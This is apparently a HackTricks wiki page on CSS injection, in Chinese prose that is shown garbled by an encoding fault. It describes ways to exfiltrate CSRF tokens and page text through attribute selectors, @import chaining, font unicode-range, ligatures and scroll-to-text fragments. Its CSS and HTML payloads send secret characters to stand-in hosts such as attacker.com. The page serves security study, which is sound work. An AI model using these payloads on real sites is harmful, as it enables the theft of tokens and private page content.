# CSS æ³¨å…¥

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


## CSS æ³¨å…¥

### å±æ€§é€‰æ‹©å™¨

CSS é€‰æ‹©å™¨è¢«è®¾è®¡ç”¨æ¥åŒ¹é… `input` å…ƒç´ çš„ `name` å’Œ `value` å±æ€§çš„å€¼ã€‚å¦‚æœè¾“å…¥å…ƒç´ çš„å€¼å±æ€§ä»¥ç‰¹å®šå­—ç¬¦å¼€å¤´ï¼Œåˆ™åŠ è½½é¢„å®šä¹‰çš„å¤–éƒ¨èµ„æºï¼š
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•åœ¨å¤„ç†éšè—è¾“å…¥å…ƒç´ ï¼ˆ`type="hidden"`ï¼‰æ—¶é¢ä¸´é™åˆ¶ï¼Œå› ä¸ºéšè—å…ƒç´ ä¸åŠ è½½èƒŒæ™¯ã€‚

#### ç»•è¿‡éšè—å…ƒç´ çš„é™åˆ¶

ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ `~` ä¸€èˆ¬å…„å¼Ÿç»„åˆå™¨æ¥å®šä½åç»­å…„å¼Ÿå…ƒç´ ã€‚ç„¶åï¼ŒCSS è§„åˆ™é€‚ç”¨äºæ‰€æœ‰è·Ÿéšéšè—è¾“å…¥å…ƒç´ çš„å…„å¼Ÿï¼Œå¯¼è‡´èƒŒæ™¯å›¾åƒåŠ è½½ï¼š
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
ä¸€ä¸ªåˆ©ç”¨æ­¤æŠ€æœ¯çš„å®é™…ç¤ºä¾‹åœ¨æä¾›çš„ä»£ç ç‰‡æ®µä¸­è¯¦ç»†è¯´æ˜ã€‚æ‚¨å¯ä»¥åœ¨ [è¿™é‡Œ](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e) æŸ¥çœ‹ã€‚

#### CSS æ³¨å…¥çš„å…ˆå†³æ¡ä»¶

ä¸ºäº†ä½¿ CSS æ³¨å…¥æŠ€æœ¯æœ‰æ•ˆï¼Œå¿…é¡»æ»¡è¶³æŸäº›æ¡ä»¶ï¼š

1. **æœ‰æ•ˆè´Ÿè½½é•¿åº¦**ï¼šCSS æ³¨å…¥å‘é‡å¿…é¡»æ”¯æŒè¶³å¤Ÿé•¿çš„æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥å®¹çº³ç²¾å¿ƒåˆ¶ä½œçš„é€‰æ‹©å™¨ã€‚
2. **CSS é‡æ–°è¯„ä¼°**ï¼šæ‚¨åº”è¯¥èƒ½å¤Ÿæ¡†æ¶é¡µé¢ï¼Œè¿™å¯¹äºè§¦å‘ä½¿ç”¨æ–°ç”Ÿæˆçš„æœ‰æ•ˆè´Ÿè½½çš„ CSS é‡æ–°è¯„ä¼°æ˜¯å¿…è¦çš„ã€‚
3. **å¤–éƒ¨èµ„æº**ï¼šè¯¥æŠ€æœ¯å‡è®¾èƒ½å¤Ÿä½¿ç”¨å¤–éƒ¨æ‰˜ç®¡çš„å›¾åƒã€‚è¿™å¯èƒ½ä¼šå—åˆ°ç½‘ç«™å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) çš„é™åˆ¶ã€‚

### ç›²å±æ€§é€‰æ‹©å™¨

æ­£å¦‚ [**åœ¨è¿™ç¯‡æ–‡ç« ä¸­è§£é‡Šçš„**](https://portswigger.net/research/blind-css-exfiltration)ï¼Œå¯ä»¥ç»“åˆé€‰æ‹©å™¨ **`:has`** å’Œ **`:not`** æ¥è¯†åˆ«ç›²å…ƒç´ ä¸­çš„å†…å®¹ã€‚è¿™åœ¨æ‚¨ä¸çŸ¥é“åŠ è½½ CSS æ³¨å…¥çš„ç½‘é¡µå†…éƒ¨å†…å®¹æ—¶éå¸¸æœ‰ç”¨ã€‚\
è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›é€‰æ‹©å™¨ä»å¤šä¸ªç›¸åŒç±»å‹çš„å—ä¸­æå–ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
ç»“åˆä»¥ä¸‹çš„ **@import** æŠ€æœ¯ï¼Œå¯ä»¥ä»ç›²é¡µé¢ä¸­é€šè¿‡ **CSS æ³¨å…¥æå–å¤§é‡ä¿¡æ¯**ï¼Œä½¿ç”¨ [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**ã€‚**

### @import

ä¹‹å‰çš„æŠ€æœ¯æœ‰ä¸€äº›ç¼ºç‚¹ï¼Œè¯·æ£€æŸ¥å…ˆå†³æ¡ä»¶ã€‚æ‚¨éœ€è¦èƒ½å¤Ÿ **å‘å—å®³è€…å‘é€å¤šä¸ªé“¾æ¥**ï¼Œæˆ–è€…æ‚¨éœ€è¦èƒ½å¤Ÿ **iframe CSS æ³¨å…¥æ¼æ´é¡µé¢**ã€‚

ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§å·§å¦™çš„æŠ€æœ¯ï¼Œä½¿ç”¨ **CSS `@import`** æ¥æé«˜æŠ€æœ¯çš„è´¨é‡ã€‚

è¿™é¦–å…ˆç”± [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) å±•ç¤ºï¼Œå…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š

æˆ‘ä»¬å°† **åªåŠ è½½é¡µé¢ä¸€æ¬¡ï¼Œå¹¶ä»…é€šè¿‡å¯¼å…¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨**ï¼ˆè¿™æ˜¯å‘é€ç»™å—å®³è€…çš„æœ‰æ•ˆè½½è·ï¼‰ã€‚
```css
@import url('//attacker.com:5001/start?');
```
1. å¯¼å…¥å°†ä¼š**æ¥æ”¶ä¸€äº›CSSè„šæœ¬**æ¥è‡ªæ”»å‡»è€…ï¼Œ**æµè§ˆå™¨å°†åŠ è½½å®ƒ**ã€‚
2. æ”»å‡»è€…å‘é€çš„CSSè„šæœ¬çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯**å¦ä¸€ä¸ª`@import`åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨**ã€‚
1. æ”»å‡»è€…çš„æœåŠ¡å™¨å°šæœªå“åº”æ­¤è¯·æ±‚ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦æ³„éœ²ä¸€äº›å­—ç¬¦ï¼Œç„¶åç”¨æœ‰æ•ˆè´Ÿè½½å“åº”æ­¤å¯¼å…¥ä»¥æ³„éœ²ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚
3. æœ‰æ•ˆè´Ÿè½½çš„ç¬¬äºŒéƒ¨åˆ†å’Œæ›´å¤§éƒ¨åˆ†å°†æ˜¯**å±æ€§é€‰æ‹©å™¨æ³„éœ²æœ‰æ•ˆè´Ÿè½½**ã€‚
1. è¿™å°†å‘æ”»å‡»è€…çš„æœåŠ¡å™¨å‘é€**ç§˜å¯†çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å’Œæœ€åä¸€ä¸ªå­—ç¬¦**ã€‚
4. ä¸€æ—¦æ”»å‡»è€…çš„æœåŠ¡å™¨æ¥æ”¶åˆ°**ç§˜å¯†çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—ç¬¦**ï¼Œå®ƒå°†**å“åº”æ­¥éª¤2ä¸­è¯·æ±‚çš„å¯¼å…¥**ã€‚
1. å“åº”å°†ä¸**æ­¥éª¤2ã€3å’Œ4**å®Œå…¨ç›¸åŒï¼Œä½†è¿™æ¬¡å®ƒå°†å°è¯•**æ‰¾åˆ°ç§˜å¯†çš„ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œç„¶åæ˜¯å€’æ•°ç¬¬äºŒä¸ª**ã€‚

æ”»å‡»è€…å°†**éµå¾ªè¿™ä¸ªå¾ªç¯ï¼Œç›´åˆ°å®Œå…¨æ³„éœ²ç§˜å¯†**ã€‚

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°åŸå§‹çš„[**Pepe Vilaçš„ä»£ç æ¥åˆ©ç”¨è¿™ä¸ª**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)ï¼Œæˆ–è€…æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å‡ ä¹[**ç›¸åŒçš„ä»£ç ä½†å¸¦æ³¨é‡Š**](./#css-injection)ã€‚

{% hint style="info" %}
è¯¥è„šæœ¬å°†å°è¯•æ¯æ¬¡å‘ç°2ä¸ªå­—ç¬¦ï¼ˆä»å¼€å¤´å’Œç»“å°¾ï¼‰ï¼Œå› ä¸ºå±æ€§é€‰æ‹©å™¨å…è®¸åšè¿™æ ·çš„äº‹æƒ…ï¼š
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
è¿™å…è®¸è„šæœ¬æ›´å¿«åœ°æ³„éœ²ç§˜å¯†ã€‚
{% endhint %}

{% hint style="warning" %}
æœ‰æ—¶è„šæœ¬**æ— æ³•æ­£ç¡®æ£€æµ‹åˆ°å‘ç°çš„å‰ç¼€ + åç¼€å·²ç»æ˜¯å®Œæ•´çš„æ ‡å¿—**ï¼Œå®ƒå°†ç»§ç»­å‘å‰ï¼ˆåœ¨å‰ç¼€ä¸­ï¼‰å’Œå‘åï¼ˆåœ¨åç¼€ä¸­ï¼‰è¿›è¡Œï¼Œå¹¶åœ¨æŸä¸ªæ—¶åˆ»ä¼šæŒ‚èµ·ã€‚\
ä¸ç”¨æ‹…å¿ƒï¼Œåªéœ€æ£€æŸ¥**è¾“å‡º**ï¼Œå› ä¸º**ä½ å¯ä»¥åœ¨é‚£é‡Œçœ‹åˆ°æ ‡å¿—**ã€‚
{% endhint %}

### å…¶ä»–é€‰æ‹©å™¨

ä½¿ç”¨**CSSé€‰æ‹©å™¨**è®¿é—®DOMéƒ¨åˆ†çš„å…¶ä»–æ–¹æ³•ï¼š

* **`.class-to-search:nth-child(2)`**ï¼šè¿™å°†æœç´¢DOMä¸­ç±»ä¸º"class-to-search"çš„ç¬¬äºŒä¸ªé¡¹ç›®ã€‚
*   **`:empty`**é€‰æ‹©å™¨ï¼šä¾‹å¦‚åœ¨[**è¿™ç¯‡æ–‡ç« **](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**ä¸­ä½¿ç”¨ï¼š**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### åŸºäºé”™è¯¯çš„XS-Search

**å‚è€ƒï¼š** [åŸºäºCSSçš„æ”»å‡»ï¼šæ»¥ç”¨@font-faceçš„unicode-range](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)ï¼Œ [åŸºäºé”™è¯¯çš„XS-Search PoCç”±@terjanqæä¾›](https://twitter.com/terjanq/status/1180477124861407234)

æ€»ä½“æ„å›¾æ˜¯**ä½¿ç”¨æ¥è‡ªå—æ§ç«¯ç‚¹çš„è‡ªå®šä¹‰å­—ä½“**ï¼Œå¹¶ç¡®ä¿**æ–‡æœ¬ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º'A'ï¼‰ä»…åœ¨æŒ‡å®šèµ„æºï¼ˆ`favicon.ico`ï¼‰æ— æ³•åŠ è½½æ—¶ä½¿ç”¨æ­¤å­—ä½“æ˜¾ç¤º**ã€‚
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **è‡ªå®šä¹‰å­—ä½“ä½¿ç”¨**ï¼š
- ä½¿ç”¨ `<style>` æ ‡ç­¾åœ¨ `<head>` éƒ¨åˆ†å®šä¹‰è‡ªå®šä¹‰å­—ä½“ï¼Œè§„åˆ™ä¸º `@font-face`ã€‚
- å­—ä½“å‘½åä¸º `poc`ï¼Œå¹¶ä»å¤–éƒ¨ç«¯ç‚¹è·å–ï¼ˆ`http://attacker.com/?leak`ï¼‰ã€‚
- `unicode-range` å±æ€§è®¾ç½®ä¸º `U+0041`ï¼Œç›®æ ‡æ˜¯ç‰¹å®šçš„ Unicode å­—ç¬¦ 'A'ã€‚

2. **å¸¦æœ‰åå¤‡æ–‡æœ¬çš„å¯¹è±¡å…ƒç´ **ï¼š
- åœ¨ `<body>` éƒ¨åˆ†åˆ›å»ºä¸€ä¸ª `id="poc0"` çš„ `<object>` å…ƒç´ ã€‚è¯¥å…ƒç´ å°è¯•ä» `http://192.168.0.1/favicon.ico` åŠ è½½èµ„æºã€‚
- æ­¤å…ƒç´ çš„ `font-family` è®¾ç½®ä¸º `'poc'`ï¼Œå¦‚ `<style>` éƒ¨åˆ†æ‰€å®šä¹‰ã€‚
- å¦‚æœèµ„æºï¼ˆ`favicon.ico`ï¼‰åŠ è½½å¤±è´¥ï¼Œåˆ™åœ¨ `<object>` æ ‡ç­¾å†…æ˜¾ç¤ºåå¤‡å†…å®¹ï¼ˆå­—æ¯ 'A'ï¼‰ã€‚
- å¦‚æœæ— æ³•åŠ è½½å¤–éƒ¨èµ„æºï¼Œåå¤‡å†…å®¹ï¼ˆ'A'ï¼‰å°†ä½¿ç”¨è‡ªå®šä¹‰å­—ä½“ `poc` æ¸²æŸ“ã€‚

### æ ·å¼æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ

**`:target`** ä¼ªç±»ç”¨äºé€‰æ‹©ç”± **URL ç‰‡æ®µ** å®šä½çš„å…ƒç´ ï¼Œå¦‚ [CSS é€‰æ‹©å™¨ç¬¬ 4 çº§è§„èŒƒ](https://drafts.csswg.org/selectors-4/#the-target-pseudo) ä¸­æ‰€è¿°ã€‚é‡è¦çš„æ˜¯è¦ç†è§£ï¼Œ`::target-text` åªæœ‰åœ¨æ–‡æœ¬è¢«ç‰‡æ®µæ˜ç¡®å®šä½æ—¶æ‰ä¼šåŒ¹é…ä»»ä½•å…ƒç´ ã€‚

å½“æ”»å‡»è€…åˆ©ç”¨ **æ»šåŠ¨åˆ°æ–‡æœ¬** ç‰‡æ®µåŠŸèƒ½æ—¶ï¼Œä¼šå‡ºç°å®‰å…¨éšæ‚£ï¼Œè¿™ä½¿ä»–ä»¬èƒ½å¤Ÿé€šè¿‡ HTML æ³¨å…¥ä»å…¶æœåŠ¡å™¨åŠ è½½èµ„æºï¼Œä»¥ç¡®è®¤ç½‘é¡µä¸Šç‰¹å®šæ–‡æœ¬çš„å­˜åœ¨ã€‚è¯¥æ–¹æ³•æ¶‰åŠæ³¨å…¥å¦‚ä¸‹çš„ CSS è§„åˆ™ï¼š
```css
:target::before { content : url(target.png) }
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœé¡µé¢ä¸Šå­˜åœ¨æ–‡æœ¬â€œAdministratorâ€ï¼Œåˆ™ä¼šä»æœåŠ¡å™¨è¯·æ±‚èµ„æº `target.png`ï¼Œè¿™è¡¨æ˜è¯¥æ–‡æœ¬çš„å­˜åœ¨ã€‚æ­¤æ”»å‡»çš„ä¸€ä¸ªå®ä¾‹å¯ä»¥é€šè¿‡ä¸€ä¸ªç‰¹æ®Šæ„é€ çš„ URL æ‰§è¡Œï¼Œè¯¥ URL åµŒå…¥äº†æ³¨å…¥çš„ CSS ä»¥åŠä¸€ä¸ª Scroll-to-text ç‰‡æ®µï¼š
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
è¿™é‡Œï¼Œæ”»å‡»åˆ©ç”¨HTMLæ³¨å…¥æ¥ä¼ è¾“CSSä»£ç ï¼Œé’ˆå¯¹ç‰¹å®šæ–‡æœ¬â€œAdministratorâ€é€šè¿‡Scroll-to-text fragmentï¼ˆ`#:~:text=Administrator`ï¼‰ã€‚å¦‚æœæ‰¾åˆ°è¯¥æ–‡æœ¬ï¼Œåˆ™åŠ è½½æŒ‡å®šèµ„æºï¼Œæ— æ„ä¸­å‘æ”»å‡»è€…å‘å‡ºå…¶å­˜åœ¨çš„ä¿¡å·ã€‚

ä¸ºäº†ç¼“è§£ï¼Œä»¥ä¸‹å‡ ç‚¹åº”æ³¨æ„ï¼š

1. **å—é™çš„STTFåŒ¹é…**ï¼šScroll-to-text Fragmentï¼ˆSTTFï¼‰æ—¨åœ¨ä»…åŒ¹é…å•è¯æˆ–å¥å­ï¼Œä»è€Œé™åˆ¶å…¶æ³„éœ²ä»»æ„ç§˜å¯†æˆ–ä»¤ç‰Œçš„èƒ½åŠ›ã€‚
2. **é™åˆ¶åœ¨é¡¶çº§æµè§ˆä¸Šä¸‹æ–‡ä¸­**ï¼šSTTFä»…åœ¨é¡¶çº§æµè§ˆä¸Šä¸‹æ–‡ä¸­æ“ä½œï¼Œä¸åœ¨iframeå†…å·¥ä½œï¼Œä½¿ä»»ä½•åˆ©ç”¨å°è¯•å¯¹ç”¨æˆ·æ›´æ˜æ˜¾ã€‚
3. **ç”¨æˆ·æ¿€æ´»çš„å¿…è¦æ€§**ï¼šSTTFéœ€è¦ç”¨æˆ·æ¿€æ´»æ‰‹åŠ¿æ‰èƒ½æ“ä½œï¼Œè¿™æ„å‘³ç€åˆ©ç”¨ä»…é€šè¿‡ç”¨æˆ·å‘èµ·çš„å¯¼èˆªæ‰å¯è¡Œã€‚è¿™ä¸€è¦æ±‚å¤§å¤§é™ä½äº†æ”»å‡»åœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹è‡ªåŠ¨åŒ–çš„é£é™©ã€‚ç„¶è€Œï¼Œåšå®¢ä½œè€…æŒ‡å‡ºäº†ç‰¹å®šæ¡ä»¶å’Œç»•è¿‡æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œä¸æµè¡Œæµè§ˆå™¨æ‰©å±•çš„äº¤äº’ï¼‰ï¼Œå¯èƒ½ä¼šé™ä½æ”»å‡»çš„è‡ªåŠ¨åŒ–éš¾åº¦ã€‚

äº†è§£è¿™äº›æœºåˆ¶å’Œæ½œåœ¨æ¼æ´å¯¹äºç»´æŠ¤ç½‘ç»œå®‰å…¨å’Œé˜²èŒƒæ­¤ç±»åˆ©ç”¨ç­–ç•¥è‡³å…³é‡è¦ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Šï¼š[https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

æ‚¨å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸ª[**ä½¿ç”¨æ­¤æŠ€æœ¯çš„CTFåˆ©ç”¨**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)ã€‚

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

æ‚¨å¯ä»¥ä¸ºç‰¹å®šçš„unicodeå€¼æŒ‡å®š**å¤–éƒ¨å­—ä½“**ï¼Œè¿™äº›å­—ä½“åªæœ‰åœ¨é¡µé¢ä¸­å­˜åœ¨è¿™äº›unicodeå€¼æ—¶æ‰ä¼šè¢«**æ”¶é›†**ã€‚ä¾‹å¦‚ï¼š
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
å½“æ‚¨è®¿é—®æ­¤é¡µé¢æ—¶ï¼ŒChrome å’Œ Firefox ä¼šè·å– "?A" å’Œ "?B"ï¼Œå› ä¸ºæ•æ„Ÿä¿¡æ¯çš„æ–‡æœ¬èŠ‚ç‚¹åŒ…å« "A" å’Œ "B" å­—ç¬¦ã€‚ä½† Chrome å’Œ Firefox ä¸ä¼šè·å– "?C"ï¼Œå› ä¸ºå®ƒä¸åŒ…å« "C"ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿè¯»å– "A" å’Œ "B"ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (I)ï¼šè¿å­— <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**å‚è€ƒï¼š** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

æ‰€æè¿°çš„æŠ€æœ¯æ¶‰åŠé€šè¿‡åˆ©ç”¨å­—ä½“è¿å­—å¹¶ç›‘æ§å®½åº¦å˜åŒ–æ¥æå–èŠ‚ç‚¹ä¸­çš„æ–‡æœ¬ã€‚è¯¥è¿‡ç¨‹åŒ…æ‹¬å‡ ä¸ªæ­¥éª¤ï¼š

1. **åˆ›å»ºè‡ªå®šä¹‰å­—ä½“**ï¼š
- SVG å­—ä½“æ˜¯é€šè¿‡å…·æœ‰ `horiz-adv-x` å±æ€§çš„å­—å½¢åˆ¶ä½œçš„ï¼Œè¯¥å±æ€§ä¸ºè¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦åºåˆ—çš„å­—å½¢è®¾ç½®äº†è¾ƒå¤§çš„å®½åº¦ã€‚
- ç¤ºä¾‹ SVG å­—å½¢ï¼š`<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`ï¼Œå…¶ä¸­ "XY" è¡¨ç¤ºä¸€ä¸ªä¸¤ä¸ªå­—ç¬¦çš„åºåˆ—ã€‚
- ç„¶åä½¿ç”¨ fontforge å°†è¿™äº›å­—ä½“è½¬æ¢ä¸º woff æ ¼å¼ã€‚

2. **æ£€æµ‹å®½åº¦å˜åŒ–**ï¼š
- ä½¿ç”¨ CSS ç¡®ä¿æ–‡æœ¬ä¸æ¢è¡Œï¼ˆ`white-space: nowrap`ï¼‰å¹¶è‡ªå®šä¹‰æ»šåŠ¨æ¡æ ·å¼ã€‚
- æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ï¼Œç»è¿‡ç‰¹åˆ«æ ·å¼å¤„ç†ï¼Œä½œä¸ºæŒ‡ç¤ºå™¨ï¼ˆoracleï¼‰ï¼Œè¡¨æ˜æ–‡æœ¬ä¸­å­˜åœ¨ç‰¹å®šçš„è¿å­—ï¼Œå› æ­¤å­˜åœ¨ç‰¹å®šçš„å­—ç¬¦åºåˆ—ã€‚
- æ¶‰åŠçš„ CSSï¼š
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **åˆ©ç”¨è¿‡ç¨‹**ï¼š
- **æ­¥éª¤ 1**ï¼šä¸ºå…·æœ‰è¾ƒå¤§å®½åº¦çš„å­—ç¬¦å¯¹åˆ›å»ºå­—ä½“ã€‚
- **æ­¥éª¤ 2**ï¼šä½¿ç”¨åŸºäºæ»šåŠ¨æ¡çš„æŠ€å·§æ¥æ£€æµ‹ä½•æ—¶æ¸²æŸ“å¤§å®½åº¦å­—å½¢ï¼ˆå­—ç¬¦å¯¹çš„è¿å­—ï¼‰ï¼ŒæŒ‡ç¤ºå­—ç¬¦åºåˆ—çš„å­˜åœ¨ã€‚
- **æ­¥éª¤ 3**ï¼šåœ¨æ£€æµ‹åˆ°è¿å­—åï¼Œç”Ÿæˆè¡¨ç¤ºä¸‰ä¸ªå­—ç¬¦åºåˆ—çš„æ–°å­—å½¢ï¼ŒåŒ…å«æ£€æµ‹åˆ°çš„å¯¹å¹¶æ·»åŠ å‰å¯¼æˆ–åç»­å­—ç¬¦ã€‚
- **æ­¥éª¤ 4**ï¼šè¿›è¡Œä¸‰ä¸ªå­—ç¬¦è¿å­—çš„æ£€æµ‹ã€‚
- **æ­¥éª¤ 5**ï¼šè¯¥è¿‡ç¨‹é‡å¤ï¼Œé€æ­¥æ­ç¤ºæ•´ä¸ªæ–‡æœ¬ã€‚

4. **ä¼˜åŒ–**ï¼š
- å½“å‰ä½¿ç”¨ `<meta refresh=...` çš„åˆå§‹åŒ–æ–¹æ³•å¹¶ä¸ç†æƒ³ã€‚
- æ›´æœ‰æ•ˆçš„æ–¹æ³•å¯èƒ½æ¶‰åŠ CSS `@import` æŠ€å·§ï¼Œæé«˜åˆ©ç”¨çš„æ€§èƒ½ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (II)ï¼šä½¿ç”¨é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„äº§ï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

è¿™ä¸ªæŠ€å·§åœ¨è¿™ä¸ª [**Slackers çº¿ç¨‹**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/) ä¸­å‘å¸ƒã€‚æ–‡æœ¬èŠ‚ç‚¹ä¸­ä½¿ç”¨çš„å­—ç¬¦é›†å¯ä»¥ **ä½¿ç”¨æµè§ˆå™¨ä¸­å®‰è£…çš„é»˜è®¤å­—ä½“** æ³„éœ²ï¼šä¸éœ€è¦å¤–éƒ¨æˆ–è‡ªå®šä¹‰å­—ä½“ã€‚

è¯¥æ¦‚å¿µå›´ç»•åˆ©ç”¨åŠ¨ç”»é€æ­¥æ‰©å±• `div` çš„å®½åº¦ï¼Œä½¿ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡æ€§ä»æ–‡æœ¬çš„â€œåç¼€â€éƒ¨åˆ†è¿‡æ¸¡åˆ°â€œå‰ç¼€â€éƒ¨åˆ†ã€‚è¿™ä¸ªè¿‡ç¨‹æœ‰æ•ˆåœ°å°†æ–‡æœ¬åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š

1. **å‰ç¼€**ï¼šåˆå§‹è¡Œã€‚
2. **åç¼€**ï¼šåç»­è¡Œã€‚

å­—ç¬¦çš„è¿‡æ¸¡é˜¶æ®µå°†å¦‚ä¸‹æ‰€ç¤ºï¼š

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


åœ¨æ­¤è¿‡æ¸¡æœŸé—´ï¼Œ**unicode-range æŠ€å·§** è¢«ç”¨æ¥è¯†åˆ«æ¯ä¸ªæ–°å­—ç¬¦ï¼Œå› ä¸ºå®ƒåŠ å…¥å‰ç¼€ã€‚è¿™æ˜¯é€šè¿‡å°†å­—ä½“åˆ‡æ¢åˆ° Comic Sans æ¥å®ç°çš„ï¼ŒComic Sans æ˜æ˜¾æ¯”é»˜è®¤å­—ä½“é«˜ï¼Œä»è€Œè§¦å‘å‚ç›´æ»šåŠ¨æ¡ã€‚è¿™ä¸ªæ»šåŠ¨æ¡çš„å‡ºç°é—´æ¥æ­ç¤ºäº†å‰ç¼€ä¸­å­˜åœ¨æ–°å­—ç¬¦ã€‚

